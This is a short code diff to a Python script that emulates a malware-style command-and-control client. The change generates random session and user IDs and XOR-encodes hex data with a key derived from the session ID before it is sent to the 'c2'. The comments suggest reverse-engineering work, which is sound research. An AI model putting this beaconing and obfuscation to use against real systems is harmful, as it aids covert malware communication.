@@ -12,6 +12,7 @@ import base64
 import subprocess
 import struct
 import zlib
+import string
 
 from dns import resolver
 from datetime import datetime
@@ -69,6 +70,8 @@ def execute_order(order, additional_data_received = ""):
 def send_receive_request(url, order_received = None, additional_data_received = ""):
   global main_url
 
+  session_id = ''.join(random.choice(string.ascii_lowercase)[:10] for _ in range(10))
+  
   if order_received is None:
     step_list = []
   else:
@@ -76,10 +79,8 @@ def send_receive_request(url, order_received = None, additional_data_received = 
 
     print("The program send this data : ", string_to_send)
 
-    string_to_send = string_to_send
-
     answer_program_string = binascii.hexlify(string_to_send.encode("ISO-8859-1")).decode("ISO-8859-1")
-    xor_byte = ord("a") # what is this byte in the program ?
+    xor_byte = ord(session_id[0]) 
     answer_message_xor = "".join([chr(ord(cs) ^ xor_byte) for cs in answer_program_string])
 
     list_message_to_c2 = []
@@ -100,9 +101,10 @@ def send_receive_request(url, order_received = None, additional_data_received = 
         }
       )
 
+  print(session_id)
   data_total_to_c2 = {
-    "sessionID":"to_complete", # i don't how how this hash is created !
-    "userID":"to_complete",
+    "sessionID":session_id,
+    "userID":''.join(random.choice(string.ascii_lowercase)[:10] for _ in range(10)),
     "steps": step_list
     }
 
